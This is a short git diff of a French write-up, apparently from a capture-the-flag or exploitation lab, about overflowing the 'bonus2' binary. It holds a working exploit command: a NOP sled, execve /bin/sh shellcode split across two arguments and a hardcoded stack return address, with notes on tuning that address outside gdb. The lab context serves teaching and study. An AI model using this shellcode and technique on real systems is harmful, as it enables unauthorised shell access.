@@ -66,7 +66,7 @@ on peut essayer de faire pointer EIP sur \xa0\xf6\xff\xbf
 Notre shellcode fait 28 caractères, et on veut une nopesled la plus grande possible donc on va le séparer en deux pour avoir 23 caractères dans la 2ème string (afin d'atteindre EIP).
 
 
-./bonus2 $(python -c 'print "\x90" * 35 + "\x31\xc0\x50\x68\x2f"') $(python -c 'print "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xaa\xf6\xff\xbf"')
+`./bonus2 $(python -c 'print "\x90" * 35 + "\x31\xc0\x50\x68\x2f"') $(python -c 'print "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xaa\xf6\xff\xbf"')`
 
 Ca marche dans gdb mais pas en vrai parce qu'il y a des décalages d'adresse, on essaie en augmentant et en baissant et au final ça marche si on utilise 0xbffff680 and below (marche avec 62 par exemple)
 
